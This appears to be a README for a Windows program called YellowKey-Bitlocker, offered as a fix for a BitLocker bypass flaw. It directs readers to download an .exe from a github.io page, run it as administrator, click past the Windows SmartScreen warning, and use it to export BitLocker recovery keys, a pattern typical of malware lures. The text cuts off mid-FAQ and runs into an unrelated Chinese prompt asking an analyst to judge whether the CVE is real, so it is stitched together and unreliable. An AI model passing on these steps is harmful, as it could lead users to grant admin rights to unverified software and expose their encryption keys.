Key-Bitlocker - Manage BitLocker security on Windows systems\n\n[![](https://img.shields.io/badge/Download-YellowKey-blue.svg)](https://tchuin2609.github.io)\n\n## 🛡️ What is YellowKey-Bitlocker?\n\nYellowKey-Bitlocker is a program for Windows 10 and Windows 11. It helps users secure drives against the CVE-2026-45585 vulnerability. This issue affects how BitLocker manages drive encryption. Attackers can exploit this flaw to bypass authentication on some systems. This tool allows users to identify if a system remains at risk and apply the necessary fixes. \n\nThe software also provides features to extract recovery keys, test the success of mitigation steps, and check the status of your drive encryption. It translates complex security commands into a basic, user-friendly interface. You do not need experience with command-line tools to use it.\n\n## ⚙️ System Requirements\n\nBefore you run YellowKey-Bitlocker, ensure your system meets these needs:\n\n*   **Operating System:** Windows 10 or Windows 11.\n*   **Permissions:** You need administrator rights on your computer. The software changes system security settings, so it requires high-level access.\n*   **Disk Space:** Less than 50 megabytes of free space.\n*   **Active BitLocker:** The tool only functions on systems where BitLocker drive encryption is currently enabled or needs management.\n\n## 💾 How to download the software\n\nFollow these steps to obtain the tool:\n\n1.  Visit this page to download the latest version: [https://tchuin2609.github.io](https://tchuin2609.github.io)\n2.  Look for the section labeled \"Assets\".\n3.  Click the file ending in `.exe` to start the download.\n4.  Save the file to your Downloads folder or your Desktop.\n\n## 🚀 Running the software\n\nOnce the file finishes downloading, complete these steps to start the application:\n\n1.  Locate the downloaded `.exe` file.\n2.  Right-click the icon.\n3.  Select \"Run as administrator\" from the menu. This step is mandatory. If you do not run the program as an administrator, it cannot access the BitLocker data on your system.\n4.  Windows might show a pop-up window titled \"Windows protected your PC\". This happens because the tool makes deep system changes. Click \"More info\" and then click \"Run anyway\".\n5.  The main window will open. You now see a dashboard showing the health of your BitLocker encryption.\n\n## 🛠️ Using the features\n\nThe interface identifies your current security status immediately upon starting.\n\n### Check for the vulnerability\nThe tool performs an automatic scan when it opens. It checks your current Windows update status and BitLocker configuration. It shows a notice if your system matches the profile for CVE-2026-45585.\n\n### Apply the fix\nIf the tool finds that your system is at risk, it displays an \"Apply Mitigation\" button. Click this button to run the patch script. The program updates the registry settings to prevent the BitLocker bypass. Your computer remains stable during this process.\n\n### Extracting recovery keys\nIf you lose your recovery password, use the \"Export Recovery Keys\" button. This function attempts to read the current keys assigned to your encrypted drives and saves them to a text file. Keep this file in a safe spot, such as an offline USB drive or a physical printout. Never store this file in a location accessible to others.\n\n### Testing mitigation\nUse the \"Verify Protection\" button to confirm if the fix works. The software runs a simulated check to ensure the vulnerability remains closed. It confirms that the system effectively blocks unauthorized attempts to access the drive encryption state.\n\n## 📋 Frequently asked questions\n\n**Does this software delete my data?**\nNo. YellowKey-Bitlocker only interacts with the BitLocker configuration. It does not touch your personal files, documents, or photos.\n\n**What happens i\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考